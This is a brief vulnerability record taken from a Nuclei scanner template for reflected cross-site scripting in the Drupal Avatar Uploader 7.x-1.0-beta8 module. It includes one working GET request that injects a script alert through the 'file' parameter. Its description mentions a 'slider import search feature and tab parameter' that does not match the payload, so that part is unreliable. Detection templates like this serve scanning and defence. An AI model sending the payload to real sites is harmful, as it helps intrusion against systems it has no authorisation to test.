# Nuclei Template: Drupal Avatar Uploader - Cross-Site Scripting
**Template ID:** drupal-avatar-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`drupal-avatar-xss.yaml`)

## Vulnerability Information & PoC

## Description
Drupal Avatar Uploader v7.x-1.0-beta8 plugin contains a cross-site scripting vulnerability in the slider import search feature and tab parameter via plugin settings.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
```

## References
- https://www.exploit-db.com/exploits/50841
- https://packetstormsecurity.com/files/166409/Drupal-Avatar-Upload-7.x-1.0-beta8-Cross-Site-Scripting.html
